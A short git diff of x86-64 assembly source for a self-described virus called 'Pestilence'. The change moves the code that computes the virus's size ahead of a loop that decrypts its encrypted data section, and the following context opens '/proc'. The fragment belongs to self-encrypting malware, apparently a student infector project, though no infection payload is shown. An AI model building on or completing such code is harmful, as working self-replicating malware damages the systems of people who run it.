@@ -143,6 +143,12 @@ section .text
         mov rbp, rsp
         sub rbp, Pestilence_size            ; allocate Pestilence struct on stack
 
+        ; load virus size
+        lea rax, _start
+        lea rbx, _finish
+        sub rbx, rax
+        mov dword VAR(Pestilence.virus_size), ebx
+        
      .decrypt_data:   
         ; Desencriptar data
         lea r10, [rel __F_data]         ; base función
@@ -164,11 +170,6 @@ section .text
         cmp rcx, (__F_data__end - __F_data)
         jl .decrypt_data_loop       
 
-        ; load virus size
-        lea rax, _start
-        lea rbx, _finish
-        sub rbx, rax
-        mov dword VAR(Pestilence.virus_size), ebx
 
     .open_proc:
         ; open("/proc", O_RDONLY, NULL)
